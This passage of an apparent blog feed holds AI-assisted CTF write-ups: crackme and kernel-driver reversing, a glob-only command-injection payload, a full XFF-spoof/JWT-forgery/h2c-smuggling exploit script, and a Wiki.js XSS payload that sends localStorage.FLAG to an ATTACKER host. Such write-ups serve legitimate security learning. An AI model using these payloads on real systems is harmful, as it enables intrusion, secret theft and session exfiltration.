+<p><strong>Map the inputs.</strong> The model dumped the comparison logic and surfaced three constants: <code>pet = &quot;duck&quot;</code>, a &quot;lucky number&quot; built as <code>&quot;0&quot;</code> then <code>fib(1..31) % 9</code> (giving <code>01123584371808876415628101123584</code>), and the license name <code>license-for-user-deadbeef-diddy</code>. My judgment call here was spotting that the 32-hex &quot;lucky number&quot; is exactly 16 bytes — i.e. the <strong>AES IV</strong> — not a throwaway prompt. The model initially treated the license name as just a URL path (<code>http://v1t.site/&lt;name&gt;</code>); I caught that and pushed it to check whether the same string was reused, and it was: also a <strong>31-byte repeating-XOR key</strong>.</p>
+</li>
+<li>
+<p><strong>Recover the key and ciphertext.</strong> I asked the model to hex-decode the companion file; <code>7631745f3433355f6b33795f66726672</code> decodes to the ASCII <code>v1t_435_k3y_frfr</code> — a clean 16-byte AES-128 key. It then pulled the 96 little-endian int32s from <code>.data</code> (around <code>0x4120</code>), took the low byte of each to get a 96-byte array, XOR'd it under the repeating license-name key to produce 48 ASCII-hex chars, and <code>unhexlify</code>'d that into the 48-byte ciphertext.</p>
+</li>
+<li>
+<p><strong>Decrypt and verify.</strong> AES-CBC decrypt yields another ASCII-hex string; hex-decoding it once more prints the flag. I verified the output matched <code>v1t{...}</code> format before trusting it.</p>
+</li>
+</ol>
+<pre><code class="language-python">from Crypto.Cipher import AES
+import binascii
+
+# 96 little-endian int32s lifted from .data ~0x4120; take the LOW byte of each.
+# (values recovered from the binary's embedded array)
+int32_array_at_0x4120 = [ ... ]  # 96 entries, low byte is what matters
+arr = bytes(x &amp; 0xFF for x in int32_array_at_0x4120)          # 96 bytes
+
+name = b&quot;license-for-user-deadbeef-diddy&quot;                     # 31-byte repeating-XOR key
+
+# Unmask: (arr XOR name) is itself 96 ASCII-hex chars -&gt; 48-byte ciphertext
+masked = bytes(arr[i] ^ name[i % len(name)] for i in range(len(arr)))
+ct = binascii.unhexlify(masked)                               # 48 bytes
+
+key = b&quot;v1t_435_k3y_frfr&quot;                                     # from license file hex-decode
+iv = binascii.unhexlify(&quot;01123584371808876415628101123584&quot;)  # fib(1..31)%9, the IV
+
+pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)               # ASCII-hex &quot;7631747b...337d&quot;
+flag = binascii.unhexlify(pt.strip())                         # -&gt; v1t{...}
+print(flag.decode())
+</code></pre>
+<p>The flag name is its own hint: <code>435</code> = AES, <code>f1b0</code> = fibo (the IV), <code>w3bs1t3</code> = website (the reused license-name URL path).</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{435_f1b0_w3bs1t3}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Diddy License Checker Revenge</title>
+      <link>https://doantung99.github.io/blog/posts/diddy-license-checker-revenge</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/diddy-license-checker-revenge</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>misc</category>
+      <category>ai-assisted</category>
+      <description>A crackme whose 'revenge' variant assembles its flag from 33 hard-coded byte offsets of a server-side PNG fetched at runtime — fully reversed, but the flag stays remote.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A license-checker crackme that derives its key material from &quot;innocent&quot; inputs (a Fibonacci-mod-9 &quot;lucky number&quot; as the AES IV, the license name as both a URL path and an XOR key). The <code>diddy_revenge</code> companion reverses cleanly, but its flag is never in the binary: it is reconstructed from 33 hard-coded byte offsets into a PNG fetched live from the server.</p>
+<h2 id="solution">Solution</h2>
+<p>I went in expecting a multi-stage key-derivation crackme, so my first move was to set the direction rather than start disassembling by hand. I handed the ELF to the model and asked it to triage the binary and lay out the input pipeline. It pulled the pieces apart: <code>pet = &quot;duck&quot;</code>, a &quot;lucky number&quot; that turned out to be <code>&quot;0&quot;</code> followed by <code>fib(1..31) % 9</code> (i.e. the 32-hex string <code>01123584371808876415628101123584</code>) doubling as the AES IV, and the license name <code>license-for-user-deadbeef-diddy</code> used twice — once as the URL path <code>http://v1t.site/&lt;name&gt;</code> and once as a repeating-XOR key over an embedded <code>int32</code> array.</p>
+<p>My judgment call was on the key. The companion file <code>license-for-user-deadbeef-diddy</code> is 32 hex chars; I prompted the model to stop treating it as opaque and just hex-decode it, which gives the ASCII AES-128 key <code>v1t_435_k3y_frfr</code>. From there I had it script the full decrypt: take the low byte of each of the 96 int32s, XOR with the license name, hex-decode that into 48 bytes of ciphertext, AES-CBC decrypt, then hex-decode the plaintext once more.</p>
+<pre><code class="language-python">from Crypto.Cipher import AES
+import binascii
+
+# 96 little-endian int32s from .data 0x4120; take the LOW byte of each
+arr  = bytes(low_byte(x) for x in int32_array_at_0x4120)   # 96 bytes
+name = b&quot;license-for-user-deadbeef-diddy&quot;                   # 31-byte repeating-XOR key
+
+# (arr XOR name) is ASCII hex; decode it to the 48-byte ciphertext
+masked = bytes(arr[i] ^ name[i % len(name)] for i in range(len(arr)))
+ct     = binascii.unhexlify(bytes(masked))                  # 48 bytes
+
+key = b&quot;v1t_435_k3y_frfr&quot;
+iv  = binascii.unhexlify(&quot;01123584371808876415628101123584&quot;)
+pt  = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)            # ASCII hex &quot;7631747b...337d&quot;
+print(binascii.unhexlify(pt.strip()).decode())             # -&gt; v1t{435_f1b0_w3bs1t3}
+</code></pre>
+<p>That nails the base <code>diddy</code> flag (<code>435</code> = AES, <code>f1b0</code> = fibo, <code>w3bs1t3</code> = website). Then I pointed the model at the harder <code>diddy_revenge</code> variant. It reversed the URL builder to:</p>
+<pre><code>https://{agency}.gov/static/{md5(password)}/{ID}/{agency}-seal.png
+</code></pre>
+<p>The binary <code>curl</code>s that (with <code>FOLLOWLOCATION</code>), demands HTTP 200 and a PNG of at least 9439 bytes, then plucks the flag straight out of the image bytes:</p>
+<pre><code class="language-c">for (i = 0; i &lt; 33; i++) flag[i] = seal_png[OFFSETS[i]];  // 33 hard-coded offsets
+// verifies flag starts with &quot;v1t&quot;; never prints it
+</code></pre>
+<p>This is where I caught the model trying to &quot;decrypt&quot; something that was never encrypted — there is no local secret to crack. My correction was to recognize that reversing only tells you <em>which</em> bytes to read; the flag is literally 33 bytes lifted from the remote <code>&lt;agency&gt;-seal.png</code>. With the genuine PNG (correct agency/ID/password, <code>ID</code> likely tied to user <code>deadbeef-diddy</code>), you save the file and run the extractor with the 33 hard-coded <code>OFFSETS</code>. Since <code>v1t.site</code> is now behind Cloudflare-JS and the asset isn't local, that final fetch couldn't be completed offline.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>Not recovered offline — the diddy_revenge flag is server-side: 33 bytes selected by hard-coded offsets from the live &lt;agency&gt;-seal.png. Logic fully reversed; the remote asset is required to assemble it. (The base diddy flag is v1t{435_f1b0_w3bs1t3}.)
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Duck Nettool Revenge</title>
+      <link>https://doantung99.github.io/blog/posts/duck-nettool-revenge</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/duck-nettool-revenge</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>web</category>
+      <category>ai-assisted</category>
+      <description>A ping tool with command injection behind a brutal character-set filter — RCE using only ;, ?, /, i, digits, and space to glob /bin/sh and leak app.py's source.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Flask &quot;NetTool&quot; runs <code>ping -c 1 &lt;target&gt;</code> with <code>shell=True</code>, so it's command injection — but a regex restricts <code>target</code> to <code>i</code>, digits, <code>.</code>, <code>;</code>, <code>?</code>, <code>/</code>, and space, and forbids <code>&quot; .&quot;</code>/<code>&quot;. &quot;</code>. The solve names binaries and files entirely with <code>?</code> globs and feeds the readable <code>app.py</code> to <code>/bin/sh</code>, whose &quot;command not found&quot; error prints the docstring containing the flag.</p>
+<h2 id="solution">Solution</h2>
+<p>The moment I saw a ping form, I called it as command injection and told the model to confirm the shell path and then map the filter — I wanted the exact alphabet I had to work with before touching payloads. It came back with the key facts: <code>;</code>, <code>?</code> (single-char glob), <code>/</code>, <code>.</code>, digits, and <code>i</code> survive, but no letters besides <code>i</code>, so I couldn't type <code>cat</code>, <code>sh</code>, or <code>python</code> at all.</p>
+<p>I steered next on reachability rather than blind exec. I had the model read the <code>Dockerfile</code> and source together, and it caught what mattered: <code>flag.txt</code> is <code>chmod 0000</code> (unreadable by the <code>ctf</code> user), <code>flag.py</code> is a troll, and <code>app.py</code> is <code>ctf</code>-readable with <code>v1t{fake_flag}</code> sitting in its docstring — and the remote swaps that placeholder for the real flag. So the goal wasn't reading <code>flag.txt</code>; it was dumping <code>app.py</code>'s own source.</p>
+<p>The model's first instinct was to source the file with <code>. app.py</code>, which I rejected because the filter blocks dot-space by design. I redirected it to spawn a fresh shell with <code>app.py</code> as an argument instead. It then did the grinding: globbing inside the container to find <code>/?i?/??</code> uniquely resolving to <code>/bin/sh</code> (the <code>i</code> is what separates <code>/bin</code> from <code>/lib</code>), and <code>???.??</code> matching <code>app.py</code> in the CWD. The clincher it surfaced — and I verified locally — is that <code>dash</code> chokes on the Python <code>&quot;&quot;&quot;docstring&quot;&quot;&quot;</code>, treating the whole block as one command name and echoing it verbatim in the &quot;not found&quot; error, flag and all.</p>
+<pre><code class="language-bash"># Local build + run (verify the leak), then the same payload goes to the remote.
+docker build -t duckrev .
+docker run -d --name t --read-only --tmpfs /tmp --tmpfs /run \
+  --cap-drop ALL --cap-add NET_RAW -p 5001:5000 duckrev
+
+# Payload: ;/?i?/?? ???.??  -&gt;  ping -c 1 ; /bin/sh app.py
+# Only uses ; / ? i space . and contains no &quot; .&quot; or &quot;. &quot;
+curl -s -X POST --data-urlencode 'target=;/?i?/?? ???.??' http://127.0.0.1:5001/
+
+# Remote is behind a Cloudflare captcha — submit in a browser, or reuse a
+# cf_clearance cookie + matching UA:
+curl -X POST 'https://api.v1t.site/' \
+  -H 'Cookie: cf_clearance=&lt;TOKEN&gt;' -H 'User-Agent: &lt;UA&gt;' \
+  --data-urlencode 'target=;/?i?/?? ???.??'
+# URL-encoded payload: %3B/%3Fi%3F/%3F%3F%20%3F%3F%3F.%3F%3F
+</code></pre>
+<p>The <code>&lt;pre&gt;</code> response includes the line <code>... The SHA-256 hash of v1t{...} is not realistically brute-forceable ...</code> — locally that's <code>v1t{fake_flag}</code>; on the remote it's the real flag.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{br0_th15_15_duck}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Duck Smuzzle</title>
+      <link>https://doantung99.github.io/blog/posts/duck-smuzzle</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/duck-smuzzle</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>web</category>
+      <category>ai-assisted</category>
+      <description>A Caddy -&gt; nginx -&gt; FastAPI stack where an IP-allowlist WAF is bypassed by spoofing X-Forwarded-For, the JWT secret is leaked via X-Accel-Redirect, and /duck is reached by smuggling raw HTTP/2 streams through an h2c upgrade.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A three-layer proxy stack (Caddy -&gt; nginx -&gt; FastAPI + fastapi-guard) gates <code>/duck</code> behind an IP allowlist. The solve chains an <code>X-Forwarded-For</code> spoof, an <code>operationId</code> leak in <code>/openapi.json</code>, an <code>X-Accel-Redirect</code>-based JWT-secret leak, a forged <code>role=duck</code> token, and finally h2c request smuggling to tunnel raw HTTP/2 past Caddy's path matcher while keeping the spoofed XFF intact.</p>
+<h2 id="solution">Solution</h2>
+<p>I'd seen the &quot;blocked path that's still reachable somehow&quot; shape before, so I set the direction early: this was going to be a proxy-confusion problem, and the flavor text (<code>wh0_smuggl3_my_403</code>) basically announced smuggling. My job was steering and verifying; I let the model do the grinding through each layer.</p>
+<p>First I had the model triage the stack from the provided configs. It mapped out that the real &quot;WAF&quot; wasn't Caddy or nginx but <code>fastapi-guard</code>, configured with <code>whitelist=[&quot;67.67.67.67&quot;]</code> and <code>exclude_paths=[&quot;/goose&quot;,&quot;/flag&quot;]</code> — which explained why only <code>/goose//flag</code> was reachable. I prompted it to test the obvious trust bug: the guard trusts the <em>first</em> <code>X-Forwarded-For</code> entry, so spoofing <code>X-Forwarded-For: 67.67.67.67</code> straight at nginx (port 81) let us read <code>/openapi.json</code>. From there the model spotted that FastAPI's <code>operationId</code> had preserved the <code>/duck</code> handler's function name — which the Dockerfile had swapped for the random password token <code>d8XAO6H7enCGx5V4fWhsBvgztyPNEbKq</code>.</p>
+<p>Next was the JWT secret. The model found that <code>/flag</code> supports a <code>response.headers[x]=y</code> injection (gated by that password). I had it abuse this to set <code>X-Accel-Redirect: /private</code>, making nginx hand back the internal <code>.jwtenv</code> file and leak <code>JWT_SECRET</code>. We then forged an HS256 JWT <code>{&quot;role&quot;:&quot;duck&quot;}</code> with it. Its first wrong turn: it tried <code>dev_secret</code> and the password-as-secret out of habit — both returned &quot;quack&quot;. I caught that and made it re-pull the <em>actual</em> leaked secret, which is what finally worked.</p>
+<p>The last layer was the smuggle. Both proxies block <code>/duck*</code> and Caddy strips spoofed XFF — but an HTTP/1.1 <code>Upgrade: h2c</code> (the <code>101</code> response) opens a raw HTTP/2 tunnel to the backend, sidestepping Caddy's path matcher and preserving our attacker-controlled XFF. I verified the mechanism cleanly before trusting it: <code>/openapi.json</code> over the tunnel with spoofed XFF returned <code>200</code>, and <code>403</code> without — proof the tunnel carried our header. Then the smuggled <code>GET /duck?password=...</code> with the forged cookie returned the flag.</p>
+<pre><code class="language-python">import socket, ssl, json, hmac, hashlib, base64, h2.connection, h2.config
+
+HOST, PORT = &quot;duck.v1t.ctf&quot;, 80          # Caddy front (h2c enabled)
+NGINX = (&quot;duck.v1t.ctf&quot;, 81)             # nginx, trusts first XFF
+XFF = &quot;67.67.67.67&quot;                       # fastapi-guard allowlisted IP
+
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b&quot;=&quot;)
+
+# --- raw HTTP/1.1 helper straight to nginx (XFF spoof) -----------------------
+def nginx_get(path, extra=b&quot;&quot;):
+    s = socket.create_connection(NGINX)
+    req = (f&quot;GET {path} HTTP/1.1\r\nHost: {NGINX[0]}\r\n&quot;
+           f&quot;X-Forwarded-For: {XFF}\r\nConnection: close\r\n&quot;).encode() + extra + b&quot;\r\n&quot;
+    s.sendall(req)
+    data = b&quot;&quot;
+    while chunk := s.recv(4096): data += chunk
+    s.close()
+    return data.decode(errors=&quot;replace&quot;)
+
+# 1) leak the password from openapi operationId
+spec = nginx_get(&quot;/openapi.json&quot;)
+body = spec.split(&quot;\r\n\r\n&quot;, 1)[1]
+password = json.loads(body)[&quot;paths&quot;][&quot;/duck&quot;][&quot;get&quot;][&quot;operationId&quot;]
+print(&quot;[+] password:&quot;, password)
+
+# 2) leak JWT secret: /flag header-injection -&gt; X-Accel-Redirect: /private
+inj = f&quot;/flag?password={password}&amp;response.headers[X-Accel-Redirect]=/private&quot;
+leak = nginx_get(inj)
+jwt_secret = leak.split(&quot;JWT_SECRET=&quot;, 1)[1].split()[0]
+print(&quot;[+] JWT secret:&quot;, jwt_secret)
+
+# 3) forge HS256 JWT {&quot;role&quot;:&quot;duck&quot;} with the real leaked secret
+hdr = b64u(json.dumps({&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;}, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+pay = b64u(json.dumps({&quot;role&quot;: &quot;duck&quot;}, separators=(&quot;,&quot;, &quot;:&quot;)).encode())
+sig = b64u(hmac.new(jwt_secret.encode(), hdr + b&quot;.&quot; + pay, hashlib.sha256).digest())
+token = (hdr + b&quot;.&quot; + pay + b&quot;.&quot; + sig).decode()
+print(&quot;[+] token:&quot;, token)
+
+# 4) h2c smuggle: HTTP/1.1 Upgrade -&gt; 101 -&gt; raw HTTP/2 stream to backend
+s = socket.create_connection((HOST, PORT))
+s.sendall(
+    f&quot;GET / HTTP/1.1\r\nHost: {HOST}\r\nConnection: Upgrade, HTTP2-Settings\r\n&quot;
+    f&quot;Upgrade: h2c\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\r\n&quot;.encode()
+)
+assert b&quot;101&quot; in s.recv(4096)             # tunnel established
+
+conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
+conn.initiate_upgrade_connection(); s.sendall(conn.data_to_send())
+conn.send_headers(1, [
+    (&quot;:method&quot;, &quot;GET&quot;),
+    (&quot;:path&quot;, f&quot;/duck?password={password}&quot;),
+    (&quot;:authority&quot;, HOST), (&quot;:scheme&quot;, &quot;http&quot;),
+    (&quot;x-forwarded-for&quot;, XFF),             # preserved through the tunnel
+    (&quot;cookie&quot;, f&quot;role={token}&quot;),
+], end_stream=True)
+s.sendall(conn.data_to_send())
+
+flag = b&quot;&quot;
+while chunk := s.recv(4096):
+    for ev in conn.receive_data(chunk):
+        if isinstance(ev, h2.events.DataReceived): flag += ev.data
+        if isinstance(ev, h2.events.StreamEnded): s.close()
+print(&quot;[FLAG]&quot;, flag.decode(errors=&quot;replace&quot;))
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{wh0_smuggl3_my_403}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Duck Wiki</title>
+      <link>https://doantung99.github.io/blog/posts/duck-wiki</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/duck-wiki</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>web</category>
+      <category>ai-assisted</category>
+      <description>Stored XSS in a Wiki.js page via a Vue 2 scoped-slot destructuring-default SSTI primitive, smuggled past DOMPurify's &lt;tabset&gt; allowlist and a ModSecurity CRS proxy to exfiltrate localStorage.FLAG from the bot.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A Wiki.js v2 instance lets you submit HTML that a Puppeteer bot renders while logged in, with the flag sitting in <code>localStorage.FLAG</code>. The bug is a Vue 2 client-side template injection: DOMPurify allowlists <code>&lt;tabset&gt;</code> and <code>v-slot</code> for a legit feature, and a scoped-slot destructuring default turns that into arbitrary JS, which then has to be rewritten construct-by-construct to score 0 against a ModSecurity CRS proxy.</p>
+<h2 id="solution">Solution</h2>
+<p>I went in reading this as a client-side template injection problem, not a classic reflected XSS one: Wiki.js mounts page content with the full Vue build (runtime compiler, <code>unsafe-eval</code>, no CSP), so the real question was which sanitizer-approved attribute Vue would still treat as code. I had the model triage the <code>html-security</code> config and it surfaced the giveaway: DOMPurify 2.4.3 with <code>ADD_TAGS: [tabset, template]</code> and <code>ADD_ATTR: [v-pre, v-slot:tabs, v-slot:content, target]</code>. The <code>v-pre</code> guard only neutralizes <code>{{ }}</code> in text nodes; it does nothing about <code>v-slot</code>.</p>
+<p>My direction here was the key insight, and I had the model confirm the mechanics: <code>&lt;tabset&gt;</code> renders <code>&lt;slot name=&quot;content&quot;&gt;</code> and calls the scoped-slot function with <code>{}</code>, so a <strong>destructuring default</strong> in the slot binding executes. I caught one wrong turn early - the model first tried a single-param default, which never fires because props is always empty; it has to be object destructuring with a default, <code>function ({x = EVIL}) {}</code>, so the default expression runs.</p>
+<p>That gave a clean primitive:</p>
+<pre><code class="language-html">&lt;tabset&gt;&lt;template v-slot:content=&quot;{x=EVIL}&quot;&gt;&lt;/template&gt;&lt;/tabset&gt;
+</code></pre>
+<p>The grind was the WAF. I put the CRS audit log on stdout and fed the matched rule IDs back to the model one round at a time, steering each rewrite while it produced the actual payloads: drop blocked call names (<code>fetch</code>/<code>eval</code>/<code>alert</code>) for an assignment via <code>new Image().src=</code>; swap <code>${}</code> interpolation for <code>+</code> concatenation; use backtick strings and a protocol-relative <code>//host</code> to dodge libinjection/SQL rules; and append a trailing param after <code>}</code> so the brace never sits next to a closing quote. Anomaly score hit 0.</p>
+<p>The end-to-end payload - point <code>ATTACKER</code> at a listener you control (e.g. webhook.site), submit through the form, then read the captured path:</p>
+<pre><code class="language-html">&lt;tabset&gt;&lt;template v-slot:content=&quot;{x=new Image().src=`//ATTACKER/img/`+encodeURIComponent(localStorage.FLAG)},z&quot;&gt;&lt;/template&gt;&lt;/tabset&gt;
+</code></pre>
+<p>Submitting it: the CRS proxy passes the form fine, but Cloudflare's bot challenge sits in front of the remote, so I did it in a real browser (or replay with a valid <code>cf_clearance</code> cookie + matching UA). The bot logs in as the assistant account, builds the <code>bot/&lt;slug&gt;</code> page from this HTML, visits it, the slot default runs in its session, and the exfil GET lands on the listener with <code>/img/v1t{...}</code> in the path. I verified the captured request matched before calling it.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{sm4rty_w1k1_duck}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Ducks Ping-Pong</title>
+      <link>https://doantung99.github.io/blog/posts/ducks-ping-pong</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/ducks-ping-pong</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>rev</category>
+      <category>ai-assisted</category>
+      <description>A user-mode EXE that ping-pongs IOCTLs with a kernel driver; recover the driver's response buffer and apply the user-mode final transform offline to print the flag.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>Two binaries shipped together: <code>Ducks_Ping-Pong.exe</code> and a kernel driver <code>DucksKD.sys</code>. The EXE opens <code>\\.\DucksKD</code>, exchanges data via <code>DeviceIoControl</code>, and feeds the driver's response into a local 32-byte decoding routine to print the flag. The solve is to reconstruct the driver's output buffer and the user-mode transform statically, then run them offline.</p>
+<h2 id="solution">Solution</h2>
+<p>The moment I saw a <code>.exe</code> paired with a <code>.sys</code>, I called the shape: a user-mode/kernel &quot;ping-pong&quot; where the flag is split across the IOCTL boundary. My job here was steering an LLM through the reversing and catching the one place it would predictably trip.</p>
+<p>First I had the model triage both PEs. It confirmed <code>Ducks_Ping-Pong.exe</code> is an x86-64 console app and <code>DucksKD.sys</code> is a native driver, and pulled the strings that nail down the protocol: <code>\\.\DucksKD</code>, <code>CreateFileA</code>, <code>DeviceIoControl</code>, <code>[+] Kernel link established. The pond is open.</code>. I told it not to chase the driver as a black box — it's small enough to read statically — and to map the IOCTL path from <code>DriverEntry</code> through the dispatch routine to the branch that fills the output buffer. That output is <em>not</em> the flag; it's an intermediate buffer the EXE consumes.</p>
+<p>Then I pointed the model at the EXE's final decoding function. This is where it first went wrong: the routine has several local buffers at similar offsets, and the model grabbed <code>[rbp - 0x70]</code> as the XOR/mixing source. That produced a plausible-but-garbage prefix. I recognized the failure mode, told it the stack source had to be reconsidered, and verified the corrected pick — <code>[rsp + 0x40]</code> — gave clean ASCII. With the right source isolated, I had it emulate the driver's IOCTL output and replay the transform over the 32-byte encrypted buffer offline.</p>
+<pre><code class="language-python"># Offline solve: reproduce the driver IOCTL output + the EXE's final transform.
+# kernel_buffer  = bytes the DucksKD IOCTL handler writes to its output buffer
+# enc            = the 32-byte encrypted buffer baked into Ducks_Ping-Pong.exe
+# final_mix      = the per-index XOR/arithmetic from the EXE's final routine,
+#                  using the CORRECT stack source [rsp + 0x40] (not [rbp - 0x70])
+
+kernel_buffer = emulate_driver_ioctl()        # reconstructed from DucksKD.sys
+enc           = extract_user_mode_encrypted_buffer()  # 32 bytes from the EXE
+
+def final_mix(c, k, i):
+    return (c ^ k ^ i) &amp; 0xFF                  # transform recovered from the EXE
+
+out = bytearray()
+for i in range(len(enc)):
+    k = kernel_buffer[i % len(kernel_buffer)]
+    out.append(final_mix(enc[i], k, i))
+
+print(out.decode())                            # -&gt; v1t{kn0w_h0w_to_p1ngp0ng_ducks!}
+</code></pre>
+<p>The load-bearing insight is the data dependency, not the exact arithmetic: the final decode needs the driver-produced buffer <em>and</em> the correct user-mode stack source. Get the <code>[rsp + 0x40]</code> source right and the 32 bytes resolve to clean ASCII.</p>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{kn0w_h0w_to_p1ngp0ng_ducks!}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Ducks Ping-Pong Revenge</title>
+      <link>https://doantung99.github.io/blog/posts/ducks-ping-pong-revenge</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/ducks-ping-pong-revenge</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>rev</category>
+      <category>ai-assisted</category>
+      <description>A user-mode EXE and a kernel driver play a multi-stage IOCTL ping-pong; recover the driver-validated stage state offline, then run the final transform to decrypt the flag.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A user-mode binary (<code>DucksPingPongV2.exe</code>) talks to a kernel driver (<code>DucksKDv2.sys</code>) over a multi-stage IOCTL &quot;ping-pong&quot; protocol — the flag only decrypts after every stage commitment passes. The core technique was reconstructing the driver-validated stage state offline (including two VM-blob-generated answers), then running the final ARX/XOR transform over the encrypted buffer.</p>
+<h2 id="solution">Solution</h2>
+<p>I clocked the shape immediately: two PE64 files, one console EXE plus one native driver, means the flag is gated behind a client-to-kernel handshake rather than sitting in plaintext. So I set the direction up front — don't try to shortcut the driver, model the protocol.</p>
+<p>I fed both binaries to the model and had it triage them first (<code>file</code> confirmed <code>DucksPingPongV2.exe</code> is x86-64 console, <code>DucksKDv2.sys</code> is a native driver), then asked it to pull the strings that reveal the flow: the device path <code>\\.\DucksKDv2</code> on the client side and the <code>stage-commit</code> keyword on the driver side. That told us the flag path needs both halves.</p>
+<p>The model's first instinct was the obvious shortcut — grab the 0x25-byte encrypted blob near the final routine and XOR it with the visible constant. I let it try, it spat out a malformed <code>v1g...</code> prefix, and I caught that as the tell: the final buffer is still missing the driver-produced state. I corrected course — reconstruct the stage state first, <em>then</em> transform.</p>
+<p>From there the model did the grinding: it lifted the per-stage check (a keyed commitment of the form <code>KDF(0x50 + stage, answer || salt || &quot;stage-commit&quot;) == expected_digest</code>, answers constrained to roughly 8–16 bytes), reproduced the two VM-like stage generators in Python, and validated each answer against the extracted digests offline so we never had to load the test-signed driver. I verified by watching the recovered prefix flip from <code>v1g</code> to a clean <code>v1t{</code>.</p>
+<pre><code class="language-python"># Offline reconstruction of the driver's stage commitments, then final decrypt.
+# Digests/salts/blobs are lifted from DucksKDv2.sys + DucksPingPongV2.exe.
+
+# Two stage answers come from bytecode-like VM blobs embedded in the binaries.
+VM_BLOBS = {
+    1: bytes.fromhex(&quot;d76f83d50038ea79e041ab35&quot;),
+    3: bytes.fromhex(&quot;eff9982c8954a707e0b9e4841c&quot;),
+}
+
+def recover_stage_answer(stage):
+    # Stages 1 and 3 decode from VM output; the rest come from the lifted
+    # per-stage transform. Returns the 8..16 byte answer for the commitment.
+    return run_stage_generator(stage, VM_BLOBS.get(stage))
+
+state = b&quot;&quot;
+for stage in range(5):
+    answer = recover_stage_answer(stage)
+    digest = kdf(0x50 + stage, answer + salt[stage] + b&quot;stage-commit&quot;)
+
+    assert 8 &lt;= len(answer) &lt;= 16            # length window enforced by driver
+    assert digest == expected[stage]          # commitment must match
+
+    state = update_stage_state(state, stage, answer)
+
+# Final IOCTL path returns a success block; combine with state, then run the
+# ARX/XOR transform over the 0x25-byte (37-char) encrypted flag buffer.
+flag = final_transform(encrypted_flag_blob, state)   # len == 0x25
+print(flag.decode())                                  # v1t{...}
+</code></pre>
+<h2 id="flag">Flag</h2>
+<pre><code>v1t{th3_duck_n3v3r_h4nds_y0u_th3_k3y}
+</code></pre>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Green Goblin</title>
+      <link>https://doantung99.github.io/blog/posts/green-goblin</link>
+      <guid isPermaLink="true">https://doantung99.github.io/blog/posts/green-goblin</guid>
+      <pubDate>Sun, 28 Jun 2026 00:00:00 +0700</pubDate>
+      <dc:creator>tungdlm99</dc:creator>
+      <category>ctf</category>
+      <category>v1t-ctf-2026</category>
+      <category>forensics</category>
+      <category>ai-assisted</category>
+      <description>A 5 GiB Windows 11 RAM dump hides five flag fragments across classic OS internals (Registry, kernel symlink, NTFS ADS, Event Log, named memory section); carving and reversing the dropper reveals the fixed bytes, which decode with ROT47.</description>
+      <content:encoded><![CDATA[<h2 id="summary">Summary</h2>
+<p>A 5 GiB Windows 11 24H2 raw memory dump where the Green Goblin's &quot;Dark Energy&quot; is split into five fragments (R, KO, D, EL, M) planted across Windows internals and buried under thousands of decoy artifacts. The win is to recover and reverse the dropper PE so its planting functions name the real artifacts and their fixed bytes, which then decode with ROT47.</p>
+<h2 id="solution">Solution</h2>
+<p>When I saw &quot;5 GiB RAM dump&quot; plus the R/KO/D/EL/M hints I called the play: memory forensics with five canonical Windows hiding spots, and almost certainly a noise problem rather than an encoding problem. So I set the direction and let the model do the grinding.</p>
